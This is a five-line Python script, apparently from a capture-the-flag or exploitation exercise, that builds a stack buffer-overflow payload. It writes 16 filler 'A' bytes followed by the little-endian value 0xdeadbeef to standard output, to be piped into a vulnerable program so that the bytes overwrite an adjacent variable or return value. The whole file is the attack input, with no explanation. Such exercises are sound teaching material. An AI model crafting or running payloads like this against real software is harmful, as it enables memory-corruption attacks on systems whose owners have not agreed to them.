import sys

payload = b"A" * 16 + b"\xef\xbe\xad\xde"
#print(str(payload))
sys.stdout.buffer.write(payload)
